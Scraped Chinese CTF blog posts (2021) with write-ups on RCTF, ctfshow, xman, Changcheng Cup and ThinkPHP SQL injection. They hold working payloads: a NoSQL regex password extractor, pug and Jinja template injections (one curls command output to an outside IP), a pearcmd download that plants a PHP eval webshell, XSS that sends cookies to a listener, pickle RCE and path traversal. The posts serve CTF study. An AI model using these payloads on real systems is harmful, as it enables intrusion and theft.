题目解析看了一下大神们的解释，才发现这题有多麻烦，核心的考点是urldecode和urlencode的交错使用，1.所有以/admin打头的请求只要不是localhost发起的请求，就会被dump掉，但是很巧的是，后面有一个匹配是匹配最后/进行url去访问所以就有了/aa/admin2.为什么是%3flogin而不是?login，首先需要url中有login，不然的也会被dump掉，但是有了login又有了?login就不会被当做是url的一部分，而是一个string，当这里urlencode以后，就会被当成是url的一部分了，并且后面还有decode解码回来，所以不会影响访问3.为什么需要二次编码？因为出题人就是这样设置的= public function route(Request $request) { $url_decoded = urldecode( $request-&gt;url ); while ($route = $this-&gt;current()) { if ($route !== false &amp;&amp; $route-&gt;matchMethod($request-&gt;method) &amp;&amp; $route-&gt;matchUrl($url_decoded, $this-&gt;case_sensitive)) { return $route; } $this-&gt;next(); } return false;} if (preg_match('#^'.$regex.'(?:\\?.*)?$#'.(($case_sensitive) ? '' : 'i'), $url, $matches)) { foreach ($ids as $k =&gt; $v) { $this-&gt;params[$k] = (array_key_exists($k, $matches)) ? urldecode($matches[$k]) : null; } $this-&gt;regex = $regex; return true; } return false;} candyshop随便注册了一个账号登录，发现后面需要用户是active才有进一步操作所以还是要先注出这个密码，根据后面的一系列跳转，发现是一个nosql数据库 import requestschars='0123456789abcdef'ans=''url=&quot;http://123.60.21.23:23333/user/login&quot;s=requests.session()for pos in range(1,100): for ch in chars: data={'username':'rabbit','password[$regex]':'^'+ans+ch+'.*$'} res=s.post(url=url,data=data) #print(data) #print(res.text) if 'Bad' in res.text: ans +=ch break if ch=='f': exit(0) print(pos,ans) 跑出密码，继续追踪登录的路由: 发现这里有一个pug的模板渲染，且内容可控,pug渲染内容还有格式要求，这里要注意一下缩进，由于有缩进，所以其实前面的内容如果不是1之类的，可能就不行了，会导致出错之类的 username=1&amp;candyname=1&amp;address='+flag=global.process.mainModule.constructor._load('child_process').execSync(&quot;cat+/flag&quot;).toString()+a=' VerySafe啥也没有，抓包的时候看到一个 Server: Caddy 找了很久的文章都没看到相关的介绍==，然后才看到有人说了一下caddy的某个目录穿越漏洞,然后测试还发现Caddy存在与Nginx一样的，使用cgi模式执行php时，a.jpg/.php将a.jpg当作php解析的问题，但是仍然受security.limit_extensions限制——相当于存在文件包含 /../../../../usr/local/lib/php/pearcmd.php?f=pearcmd&amp;+install+-R+/tmp/+http://110.42.133.xxx/pear.php/../../../../tmp/tmp/pear/download/pear.php","link":"/2021/09/15/Rctf/"},{"title":"使用pear命令直接写马","text":"register_argc_argv1.首先了解到这个参数默认是ON的2.当这个参数开启的时候，php会注册argc和argc这两个全局变量。 pearPear 是 PHP 扩展与应用库（the PHP Extension and Application Repository）的缩写，是一个 PHP 扩展及应用的一个代码仓库。Pear 仓库代码是以包（package）分区，每一个 Pear package 都是一个独立的项目有着自己独立的开发团队、版本控制、文档和其他包的依赖关系信息。Pear package 以 phar、tar 或 zip 发布。 因为pear是包管理器，所以存在下载和安装包功能在pear命令的源码下，可以发现: #!/bin/sh# first find which PHP binary to useif test &quot;x$PHP_PEAR_PHP_BIN&quot; != &quot;x&quot;; then PHP=&quot;$PHP_PEAR_PHP_BIN&quot;else if test &quot;/usr/local/bin/php&quot; = '@'php_bin'@'; then PHP=php else PHP=&quot;/usr/local/bin/php&quot; fifi# then look for the right pear include dirif test &quot;x$PHP_PEAR_INSTALL_DIR&quot; != &quot;x&quot;; then INCDIR=$PHP_PEAR_INSTALL_DIR INCARG=&quot;-d include_path=$PHP_PEAR_INSTALL_DIR&quot;else if test &quot;/usr/local/lib/php&quot; = '@'php_dir'@'; then INCDIR=`dirname $0` INCARG=&quot;&quot; else INCDIR=&quot;/usr/local/lib/php&quot; INCARG=&quot;-d include_path=/usr/local/lib/php&quot; fifiexec $PHP -C -q $INCARG -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=&quot;&quot; -d safe_mode=0 -d register_argc_argv=&quot;On&quot; -d auto_prepend_file=&quot;&quot; -d auto_append_file=&quot;&quot; $INCDIR/pearcmd.php &quot;$@&quot; ，可以看到后面调用了argv的值，是从包含的另一个文件中来的 require_once 'Console/Getopt.php';/* ... */$argv = Console_Getopt::readPHPArgv(); 在console/Getopt.php有如下实现方法: public static function readPHPArgv() { global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;; return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv; } 可以看到获取$argv的方式是global $argv --&gt; $_SERVER['argv'] --&gt; $GLOBALS['HTTP_SERVER_VARS']['argv'] 利用链当我们包含pearcmd.php的时候，相当于包含了这个php文件里面的所有变量，由于argv变量我们可控，那么我就可以通过pear命令来getshell了 pear命令任意文件下载首先要cd到/usr/lib/php然后用 pear dowload http://xxx.xx.xx.xx/pear.php 即可下载到当前目录下如果/var/www/html目录可写: pear install -R /var/www/html http:/xxxxxx/pear.php 如何使用argv和argc传值进行peargetshell 阅读底层c代码 PHPAPI void php_build_argv(const char *s, zval *track_vars_array){zval arr, argc, tmp;int count = 0;if (!(SG(request_info).argc || track_vars_array)) {return;}array_init(&amp;arr);/* Prepare argv */if (SG(request_info).argc) { /* are we in cli sapi? */int i;for (i = 0; i &lt; SG(request_info).argc; i++) {ZVAL_STRING(&amp;tmp, SG(request_info).argv[i]);if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) {zend_string_efree(Z_STR(tmp));}}} else if (s &amp;&amp; *s) {while (1) {const char *space = strchr(s, '+');/* auto-type */ZVAL_STRINGL(&amp;tmp, s, space ? space - s : strlen(s));count++;if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) {zend_string_efree(Z_STR(tmp));}if (!space) {break;} s= space + 1;}} 可以知道argv通过query_string取值，并通过+作为分隔符 // web目录可写- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php- http://ip:port/tmp/pear/download/evil.php// tmp目录可写- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php- http://ip:port/include.php?f=/tmp/pear/download/evil rctf的payload /../../../../usr/local/lib/php/pearcmd.php?f=pearcmd&amp;+install+-R+/tmp/+http://110.42.133.xxxx/pear.php/../../../../tmp/tmp/pear/download/pear.php&lt;script language='php'&gt;eval($_POST['a']);&lt;/script&gt;&lt;script language='php'&gt; eval($_POST['a']);&lt;/script&gt;","link":"/2021/09/13/%E4%BD%BF%E7%94%A8pear%E5%91%BD%E4%BB%A4%E7%9B%B4%E6%8E%A5%E5%86%99%E9%A9%AC/"},{"title":"跨站脚本攻击","text":"xss打cookie姿势总结xss攻击是客户端攻击 xss是什么将任意javascript代码插入到其他web用户页面执行以达到攻击目的当用户里浏览改页时，恶意代码将会被执行，用户的信息等将被窃取。 容易产生xss的地方1.数据交互的地方：get、post、cookies、headers2数据输出的地方： ctf中的xss&lt;script&gt;windows('http://127.0.0.1:1234?q='+btoa(document.cookie))&lt;/script&gt;&lt;script&gt;windows.location.href='http://127.0.0.1:1234?q='+btoa(document.cookie)&lt;/script&gt; &lt;script&gt;var img=document.createElement('img');img.src='http://127.0.0.1:1234/?q='+btoa(document.cookie);document.body.append(img)&lt;/script&gt; 将以上内容插入含有xss漏洞的页面中，其他用户访问这些页面，你在本地监听1234端口，即可获得他们的一些cookie信息","link":"/2021/09/18/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"},{"title":"2021长城杯","text":"ez_pythonimport pickleimport base64from flask import Flask, requestfrom flask import render_template,redirect,send_from_directoryimport osimport requestsimport randomfrom flask import send_fileapp = Flask(__name__)class User(): def __init__(self,name,age): self.name = name self.age = agedef check(s): if b'R' in s: return 0 return 1@app.route(&quot;/&quot;)def index(): try: user = base64.b64decode(request.cookies.get('user')) if check(user): user = pickle.loads(user) username = user[&quot;username&quot;] else: username = &quot;bad,bad,hacker&quot; except: username = &quot;CTFer&quot; pic = '{0}.jpg'.format(random.randint(1,7)) try: pic=request.args.get('pic') with open(pic, 'rb') as f: base64_data = base64.b64encode(f.read()) p = base64_data.decode() except: pic='{0}.jpg'.format(random.randint(1,7)) with open(pic, 'rb') as f: base64_data = base64.b64encode(f.read()) p = base64_data.decode() return render_template('index.html', uname=username, pic=p )if __name__ == &quot;__main__&quot;: app.run('0.0.0.0',port=8888) 定位一下关键函数pickle 考点就呼之欲出了pickle反序列化绕过r字符 user = pickle.loads(user) 有现成的链子可以直接打 import requestsimport pickleimport base64#e = 'ls / -a'e = 'cat /flagggggggggggggaaa's = pickle.dumps(e)# print(s)payload = b'c__main__\\nUser\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubV' + \\ e.encode()+b' &gt; /tmp/1.txt\\nb.'response = requests.get(&quot;http://eci-2zedqu5w4d2328dulcrt.cloudeci1.ichunqiu.com:8888/?pic=/tmp/1.txt&quot;,cookies=dict( user=base64.b64encode(payload).decode()))print(response.text)for l in response.content.decode().split(&quot;\\n&quot;): if &quot;base64&quot; in l: l = l.split(&quot;\\&quot;&quot;)[1].split(&quot;,&quot;)[1] print(base64.b64decode(l).decode()) java_urljava项目下都有一个配置文件可以下载 /download?filename=../../../../WEB-INF/web.xml 然后就可以拿到很多路由接下来下载源码 /download?filename=../../../../WEB-INF/classes/com/test2/aaa1/testURL.class/download?filename=../../../../WEB-INF/classes/com/test2/aaa1/download.class 在审计源码的时候可以看到 String pri = tartget_url.substring(0, tartget_url.indexOf(&quot;:&quot;));if (pri.matches(&quot;(?i)file|(?i)gopher|(?i)data&quot;)) { 第一个冒号前不可以是以下三种协议，所以要找一个放在file协议前面，却又不会报错的 url:file:///etc/passwdurl:file:///url:file:///flag 这样就可以了","link":"/2021/09/19/2021%E9%95%BF%E5%9F%8E%E6%9D%AF/"},{"title":"关于url的一些小trick","text":"前言感觉最近遇到挺多ssrf的题目，然后就遇到了挺多这种url绕过的小trick，所以来复习一下 1.访问路径的后缀被写死时可以使用?a=后缀，或者#进行绕过eg: 以jpg结尾http://xxxx?a=jpg此时访问的内容即为?a前面的东西 2. requests ipv6、ipv6 zone requests.get(http://[::FFFF:127.0.0.1]:23334) requests.get(http://[::FFFF:127.0.0.1%abc]:23334)host 支持 url 编码，端口号数字扩展位数requests.get(http://%61.baidu.com:00080).text 3.python的urllib支持读取任意文件 ``python # python3 # 都相当于打开了 (http://a.baidu.com/) urllib.request.urlopen(http://[a.baidu.com]).read() urllib.request.urlopen(&lt;http://[a.baidu.com]&gt;).read() urllib.request.urlopen(&lt;URL:http://[a.baidu.com]&gt;).read()urllib.request.urlopen('file:///etc/passwd').read()# python2 # 都相当于打开了 [http://a.baidu.com](http://a.baidu.com/) urllib.urlopen(&lt;URL:http://[a.baidu.com]&gt;).read() # 读文件 老东西了 urllib.urlopen('local_file:///etc/passwd').read() urllib.urlopen('local-file:///etc/passwd').read() # 相当于用 ftp 打开 urllib.urlopen('//localhost:23334') urllib.urlopen('ftp://evil:23334') # 若服务端返回 PASV 模式的服务器与端口，python 2 不做验证直接连接urllib.urlopen('local_file:///etc/passwd').read()urllib.urlopen('local-file:///etc/passwd').read() 4. PHP:file_get_contents(&quot;file://localhost/etc/passwd&quot;); 5. Java:new URL('url:file:///etc/passwd') 6.ipv6三个小trick x.1.ip6.name0--1.ipv6-literal.net2408-8207-1850-2a60--4c8.ipv6-literal.net","link":"/2021/09/19/%E5%85%B3%E4%BA%8Eurl%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8Ftrick/"},{"title":"ctfshow中秋","text":"前言中秋节没啥事，看到学长在做这个比赛的题目，也来看看，题目挺简单的，就是第三题没见过，学习一下 第一题0e弱类型 第二题一个典型的控制器类定义如下： namespace app\\index\\controller;class Index { public function index() { return 'index'; }} 控制器类文件的实际位置是 application\\index\\controller\\Index.php 当控制器的定义为: namespace app\\index\\controller;class Index { public function hello() { return 'hello,world!'; } public function data() { return ['name'=&gt;'thinkphp','status'=&gt;1]; }} 那么想要访问不同的路由就要: http://localhost/index.php/index/Index/hellohttp://localhost/index.php/index/Index/data 回来看一下源码要访问下面的内容的路由就为 /index.php/index/index/backdoor 访问以后说 /../../'.&quot;install.lock has not been deleted&quot;; 这个文件存在，无法进行下一步，所以首先要将这个文件删除看了一下源码有一个反序列化，随便输入一个数字，报错发现是tp5.0.24的框架，搜索了一下，有一条链子，但是是任意文件写入的链子，看了一下源码，在入口就有一个unlink函数所以 &lt;?phpnamespace think\\process\\pipes;class Windows{ private $files=[]; function __construct(){ $this-&gt;files = ['/var/www/html/application/index/controller/../../install.lock']; }}echo urlencode(serialize(new Windows())); 链子长这样就行了=-= 然后就是post一个cmd参数去拿flag由于最后的flag有个正则匹配，所以要绕过，一般绕过关键字用通配符啥的都行，但是这里外面包裹了单引号，就需要使用不可打印的字符进行绕过了，这点到时候磨了很久，还有个更无语的就是，不知道为啥在网页那边用hackbar发送出去没有flag，而在burp里面才可以 第三题&lt;?php// 题目说明：// 想办法维持权限，确定无误后提交check，通过check后，才会生成flag，此前flag不存在error_reporting(0);highlight_file(__FILE__);$a=$_GET['action'];switch($a){ case 'cmd': eval($_POST['cmd']); break; case 'check': file_get_contents(&quot;http://checker/api/check&quot;); break; default: die('params not validate');} 不是很懂题目的意思，看了wp以后，推测是让php出在休眠状态不作反应，这样在check的时候权限就维持在原来的状态了 cmd=file_put_contents(&quot;/tmp/index.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);system(&quot;sleep 5 %26%26 php -S 0.0.0.0:80 -t /tmp/&quot;);","link":"/2021/09/20/ctfshow%E4%B8%AD%E7%A7%8B/"},{"title":"2021xman选拔赛","text":"前言复现Rctf的比赛，复现到一半发现其他都是不过10解的数，就没在看了，看了一下xman的比赛解出来的人数还挺多，于是就想说去看看 ezphp&lt;?phperror_reporting(0);highlight_file(__FILE__); class XMAN{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = &quot;Hel&quot;; $this-&gt;para = &quot;xctfer&quot;; echo new $this-&gt;class ($this-&gt;para); } public function __wakeup() { $this-&gt;check = new Filter; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('what?Really?'); } }class Hel{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (&quot;Hello bro, I guess you are a lazy &quot;.$this-&gt;a); }}class Filter{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|&quot;|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; }} if(isset($_GET['xctf'])){ unserialize($_GET['xctf']);}else{ $a=new XMAN; } 自己写个demo复现一下看看，反序列题，却又没给可以命令执行或者读文件的函数，那八成就是考察内置类了，定位了一下，似乎也就是这里了 先构造一下链条，看看如何到这里，再去寻找内置类： &lt;?phpclass XMAN{ public $class; public $para; public $check; public function __construct() { } public function __wakeup() { $this-&gt;check = new Filter; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('what?Really?'); }}class Hel{}class Filter{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|&quot;|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; }}$a=new XMAN();$b='SplFileObject';$c='flag.txt';$a-&gt;class=$b;$a-&gt;para=$c;echo serialize($a); 根本就不用咋构造哈哈哈哈=-=，偶尔做做简单题，增强一下自信心 你的名字听说这题是原题，发现自己buu这题也还没做，做一下： 这不是一看就大概率是模板注入了？测试一下看看是什么模板看起来是过滤了两个中括号，一个中括号是没事的，所以payload直接打这里的过滤规则是这样的，扫描列表并将其替换为空，然后config放在最后一个，那扫到最后一个的时候，将其替换为空，那么语句就会以正确的形式显示了，多收藏几个payload: {% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('curl http://110.42.133.120:9999/ -d `ls / | grep flag`;') %}1{% endiconfigf %} {%set a='__bui'+'ltins__'%}{%set b='__im'+'port__'%}{%set c='o'+'s'%}{%set d='po'+'pen'%}{%print(lipsum['__globals__'][a][b](c)[d]('ls /')['read']())%}","link":"/2021/09/22/2021xman%E9%80%89%E6%8B%94%E8%B5%9B/"},{"title":"shiro权限验证绕过","text":"SHIRO介绍shiro是一个java安全框架，用于执行身份验证、授权、密码、和会话管理系统，通常，shiro会和spring等框架一起搭配用于web应用系统的开发 权限验证方式shiro是基于url的权限验证，配置的url模式使用ant风格模式，ant路径通过通配符支持”?”、”“、”\\*“。对于”?”，其匹配一个字符串。如”/admin?”将匹配”/admin1”、但不匹配”/admin”或者”/admin/“ 对于”“,其匹配/admin/abc”，但不匹配/admin/a/b对于”\\*“，其匹配路径中的零个或多个路径，如“/admin/**”将匹配“/admin/a”或“/admin/a/b”。 常用的拦截器配置anon拦截器表示匿名访问authc拦截器表示需要身份认证过后才能访问拦截器的匹配顺序采取第一次匹配优先的方式，即从头开始第一个匹配的url模式对应的拦截器链 eg:Map&lt;String, String&gt; map = new LinkedHashMap&lt;&gt;();map.put(&quot;/doLogin&quot;, &quot;anon&quot;);map.put(&quot;/admin/*&quot;, &quot;authc&quot;);map.put(&quot;/manage/*&quot;, &quot;authc&quot;); CVE-2020-1957","link":"/2021/09/24/spring-security/"},{"title":"PHP框架基础语法学习","text":"前言刚好最近做的挺多挖链子的题目都有涉及命名空间的知识点，之前都是在一个php文件中进行了链子的挖掘，现在分散到很多文件中，虽然本质是一样的，但是如果没有理解好命名空间的含义，一时半会想要做出来也是有难度的 命名空间要理解好命名空间的话可以和目录做一个类比，比如说有一个目录为/home他下面有一个foo.txt，那么对于这个foo.txt来说，这个home就是一个命名空间， 命名空间的声明可避免类或函数名重复导致的各种问题。使用namespace可以声明、切换命名空间。 在程序当中，其作用是按照一种虚拟的层次结构组织 PHP 代码，这种层次结构类似操作系统中文件系统的目录结构。 直接举个栗子：一个典型的控制器类定义如下： namespace app\\index\\controller;class Index { public function index() { return 'index'; }} 控制器类文件的实际位置是 application\\index\\controller\\Index.php 当控制器的定义为: namespace app\\index\\controller;class Index { public function hello() { return 'hello,world!'; } public function data() { return ['name'=&gt;'thinkphp','status'=&gt;1]; }} 那么想要访问不同的路由就要: http://localhost/index.php/index/Index/hellohttp://localhost/index.php/index/Index/data 回来看一下源码要访问下面的内容的路由就为 /index.php/index/index/backdoor 什么是控制器？控制器就是MVC设计模式中的C（Controller），通常用于读取视图V（View）、完成用户输入以及处理模型数据M（Model）。 按照ThinkPHP的架构设计，所有的URL请求（无论是否采用了路由），最终都会定位到控制器（也许实际的类不一定是控制器类，但也属于广义范畴的控制器）。控制器的层可能有很多，为了便于区分就把通过URL访问的控制器称之为访问控制器（通常意义上我们所说的控制器就是指访问控制器）。 例如我们访问一个URL地址： http://tp5.com/index/index/hello 实际上访问的是index模块下的Index控制器类的hello方法（在没有定义任何路由的情况下），Index控制器对应的类就是app\\index\\controller\\Index（为什么控制器类名需要这样命名后面命名空间部分会详细描述），完成上面的URL访问，只需要定义如下的控制器类，看起来非常简单： 什么是命名空间现在来分析下控制器的类名为什么是app\\index\\controller\\Index而不是Index，首先就是要明白命名空间的概念。PHP从5.3版本开始引入命名空间的概念，其主要作用是确保类名不会冲突，因为在一个应用中，出现相同的类名的几率非常之大，并且你很难保证引入的第三方类库不冲突，而有了命名空间后，相当于给自己的类加了一个门牌号一样，一个类的组成包括： 类的组成 = 根命名空间+子命名空间（可选）+类名 app\\index\\controller\\Index，这是ThinkPHP框架制定的规范，app是应用类库的根命名空间，也就是所有的应用类库都应该用app作为根命名空间定义。index是表示模块目录，controller表示的是控制器（确切的说是访问控制器）目录，Index是实际的控制器类名，所以要表示index模块的Index控制器类，使用的就是app\\index\\controller\\Index，如果是admin模块的Index控制器类，使用的就是app\\admin\\controller\\Index类，如果使用的是单一模块的话，那么Index控制器类就变成了app\\controller\\Index 控制器继承前面是一个很简单的例子，没有继承任何的类（这样并没有任何不对，5.0的控制器设计如此，事实上也非常高效），控制器可以继承系统内置的控制器基类think\\Controller或者应用自己的控制器基类，来扩展更多的功能和方法。 继承系统控制器基类： &lt;?phpnamespace app\\index\\controller;use think\\Controller;class Index extends Controller{ public function hello() { return 'hello,world'; }}","link":"/2021/09/26/PHP%E6%A1%86%E6%9E%B6%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"},{"title":"2021安恒9月赛","text":"前言战队的神仙大佬们都在打TCTF，我看不懂题目但我大为震撼，而我还在打安恒月赛，这大概就是世界的参差吧。。。。 hellounser拿了一个一血，可能是题目比较简单吧 &lt;?phpclass A { public $var; public function show(){ echo $this-&gt;var; } public function __invoke(){ $this-&gt;show(); }}class B{ public $func; public $arg; public function show(){ $func = $this-&gt;func; if(preg_match('/^[a-z0-9]*$/isD', $this-&gt;func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this-&gt;arg)) { die('No!No!No!'); } else { include &quot;flag.php&quot;; //There is no code to print flag in flag.php $func('', $this-&gt;arg); } } public function __toString(){ $this-&gt;show(); return &quot;&lt;br&gt;&quot;.&quot;Nice Job!!&quot;.&quot;&lt;br&gt;&quot;; }}$a=new A();$b=new B();$b-&gt;func=&quot;create_function&quot;;$b-&gt;arg=&quot;}require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//&quot;;$a-&gt;var=$b;echo serialize($a);?&gt; xxc发现自己在挖掘这种框架下的链子的时候很不熟练，主要是不会书写命名空间的语法首先是确定起点——&gt;寻找destruct魔术方法，其中$process可控，并且指向一个函数，寻找__call看看有没有_call方法 namespace Control\\State;class StopHook { protected $output; protected $config = ['auto' =&gt; 0]; protected static $states = ['started', 'running', 'finished', 'waiting', 'fail']; protected $processes; public function __destruct() { $this-&gt;_exit(); } private function _exit() { foreach(array_reverse($this-&gt;processes) as $process) { if (!$process-&gt;isRunning) { continue; } $process-&gt;stop(); } }} 在这个命名空间下有call方法，让其跳转至此，发现一个echo，看看是否有__tostring方法 &lt;?phpnamespace Faker;class MyGenerator { protected $defaultValue; public function __call($method, $arg_array) { echo $this-&gt;defaultCall; return $this-&gt;defaultCall; } public function __get($property) { return $this-&gt;defaultValue; }} 在这个命名空间下可以发现一个tostring，跟进以后，发现其存在一个isset，那么就只需要寻找__isset魔术方法，看看是否能继续跳转 &lt;?phpnamespace Method\\Func;class GetFile { private $flag = true; private $files = []; public function __toString() { return $this-&gt;getFiles(); } public function getFiles() { if (!$this-&gt;flag) return &quot;denied&quot;; $s = &quot;&quot;; if (isset($this-&gt;flag-&gt;{$this-&gt;value})) { return &quot;test&quot;; } foreach ($this-&gt;files as $file) { $s += $file-&gt;read(); } return $s; }} 在这里会回来执行popup，并且存在一个$s($length)，类似于调用一个函数，那么如果将这个函数调用方式改为对象，即可触发__invoke方法 &lt;?phpnamespace Method\\Func;class GetDefault { private $source; public function popup($length) { $s = $this-&gt;source; if ($s-&gt;flag != &quot;myTest&quot;) { return &quot;denied&quot;; } return $s($length); } public function __isset($property) { if ($property != &quot;test&quot;) { return false; } return !$this-&gt;popup(666); }} 序列化终点就在这里，调用这个call_user_func实现命令执行 &lt;?phpnamespace Method\\Func;class GenerateFile { public $flag; protected $buffer; public function __invoke($param) { $this-&gt;myGen($param); } public function myGen($length) { $s = $this-&gt;buffer-&gt;read; call_user_func($this-&gt;source-&gt;generate, $length); return $s; }} 那么最终构造的链条如下： &lt;?phpnamespace Control\\State;use Faker\\MyGenerator;{ class StopHook { protected $output; protected $config = ['auto' =&gt; 0]; protected static $states = ['started', 'running', 'finished', 'waiting', 'fail']; protected $processes; public function __construct() { $this-&gt;processes=array(new MyGenerator()); } public function __destruct() { $this-&gt;_exit(); } private function _exit() { foreach (array_reverse($this-&gt;processes) as $process) { if (!$process-&gt;isRunning) { continue; } $process-&gt;stop(); } } } include(&quot;D:\\apache\\www\\安恒月赛\\www\\closure/autoload.php&quot;);#这边似乎不影响，我在本地需要调用这个文件，但是题目已经自动给你包含了，所以问题不大 $a=new StopHook(); echo base64_encode(serialize($a));}namespace Faker;use Method\\Func\\GetFile;{ class MyGenerator { protected $defaultValue; public function __construct()#构建对象时被调用 { $this-&gt;defaultValue = new GetFile(); } public function __call($method, $arg_array) { echo $this-&gt;defaultCall; return $this-&gt;defaultCall; } public function __get($property) { return $this-&gt;defaultValue; } }}namespace Method\\Func;{ class GetFile { private $flag = true; private $files = []; public function __construct() { $this-&gt;flag = new GetDefault(); $this-&gt;value = &quot;test&quot;; } public function __toString() { return $this-&gt;getFiles(); } public function getFiles() { if (!$this-&gt;flag) return &quot;denied&quot;; $s = &quot;&quot;; if (isset($this-&gt;flag-&gt;{$this-&gt;value})) { return &quot;test&quot;; } foreach ($this-&gt;files as $file) { $s += $file-&gt;read(); } return $s; } } class GetDefault { private $source; public function __construct() { $this-&gt;source = new GenerateFile(); $this-&gt;source-&gt;flag = &quot;myTest&quot;; } public function popup($length) { $s = $this-&gt;source; if ($s-&gt;flag != &quot;myTest&quot;) { return &quot;denied&quot;; } return $s($length); } public function __isset($property) { if ($property != &quot;test&quot;) { return false; } return !$this-&gt;popup(666); } } class GenerateFile { public $flag; protected $buffer; public $source; public function __construct() { $function = function () { system(&quot;ls&quot;); }; $a = \\Opis\\Closure\\serialize($function); $b = unserialize($a); $this-&gt;source-&gt;generate = $b; } public function __invoke($param) { $this-&gt;myGen($param); } public function myGen($length) { $s = $this-&gt;buffer-&gt;read; call_user_func($this-&gt;source-&gt;generate, $length); return $s; } } } 其中需要说明的是，在每次调用链的时候都要先声明一下所在的命名空间，并且，如果需要调用到其他命名空间的内容的时候，需要使用use,举个例子use Method\\Func\\GetFile;不然就会报错 有点可惜的是，比赛的时候已经构造出链子了，但是当时没学好命名空间的基本用法，所以就一直打不通哎~","link":"/2021/09/25/2021%E5%AE%89%E6%81%929%E6%9C%88%E8%B5%9B/"},{"title":"2021天翼杯(thinkphp5.0.15sql注入漏洞+)","text":"前言:主要是想练习一下如何在框架下挖漏洞 环境搭建通过以下命令获取测试环境代码： composer create-project --prefer-dist topthink/think=5.0.15 tpdemo 将 composer.json 文件的 require 字段设置成如下： &quot;require&quot;: { &quot;php&quot;: &quot;&gt;=5.4.0&quot;, &quot;topthink/framework&quot;: &quot;5.0.15&quot;} 然后执行 composer update ，并将 application/index/controller/Index.php 文件代码设置如下： &lt;?phpnamespace app\\index\\controller;class Index{ public function index() { $username = request()-&gt;get('username/a'); db('users')-&gt;insert(['username' =&gt; $username]); return 'Update success'; }} 在 application/database.php 文件中配置数据库相关信息，并开启 application/config.php 中的 app_debug 和 app_trace 。创建数据库信息如下： create database tpdemo;use tpdemo;create table users( id int primary key auto_increment, username varchar(50) not null); 漏洞复现insert()注入复现这里直接就去调用insert函数，所以我直接把断点下在这里，往下看数据的变化数据以数组的形式被传入parsedata进行数据解析 在此处直接对输入的数组数据先进行选择，后直接进行拼接 并且直接对结果进行了一个返回后续直接将该输入拼接在insert语句的后半段造成报错注入: select()注入复现断点我直接搭载前面get这里，然后看他一个值的传入 首先从我们传入的数组中取值，并且值得注意的是，这个函数会递归到更深层次的数组中接下来会进入一个过滤，很奇怪的是，在别人复现的源码里，notlike是合起来写的，所以当我们在这里写not like的时候，就可以绕过，但是不知道为什么这里的源码两个都有过滤后面继续经过一系列拼接赋值操作，其中select函数中，where内容是可控的 有难度应该就是这段数组结果进行转化拼接的，这里介绍一下，我们传入的了一个username[0]那么他就会被拼接在最前面，接下来，我们再传入一个username[1][1\\]=%和username\\[1\\]\\[2\\]=aaa那么他会被分别拼接到两个`username`后所接入的内容呢，也就是username not like '%' 然后username not like aaa 紧接着如果我们有username\\[2\\]的话，那么这个也就会被直接被先拼接到username\\[1\\]\\[1\\]的后面 wherestr的内容将被拼接为以下内容，通过$array的值进行分割后，再加上一个括号 eg:array[1]=abc;array[2]=bcd;login=123;(abc 123 bcd) 带回到原查询语句，可以发现这在 在mysql中测试 payload:?password=2&amp;username[0]=not like&amp;username[1][0]=%25&amp;username[1][1]=aaa&amp;username[2][0]=) union select 1,2,3%23&amp;username[2][1]=123 https://blog.csdn.net/weixin_45669205/article/details/116464224","link":"/2021/09/27/2021%E5%A4%A9%E7%BF%BC%E6%9D%AF/"},{"title":"javascript奇妙的变量类型安全问题","text":"变量类型污染问题js数据类型值类型(基本类型): 字符串，数字，布尔，对空，未定义，symbol(es6引入一种新的原始数据类型，表示独一无二的值) 引用数据类型: 对象(object)，数组(array)，函数(function) 对象花括号分割，在括号内部，对象的属性以名称和值对的形式(name : value)来定义属性由逗号分割: eg:var person={firstname:&quot;John&quot;,lastname:&quot;Doe&quot;}此时对象person有三个属性，firstname,lastname 对象属性寻址方式 name=person.lastname;name=person[&quot;lastname&quot;]; json可以发送的数据JSON 值可以是： 数字（整数或浮点数） 发送1 #typeof number 字符串（在双引号中） 发送&quot;a&quot;#typeof string 逻辑值（true 或 false） 发送true#typeof boolean 数组（在中括号中） 发送[&quot;a&quot;,&quot;b&quot;]#typeof object 对象（在大括号中） 发送{&quot;name&quot;: &quot;Tom&quot;,&quot;Grade&quot;:1, 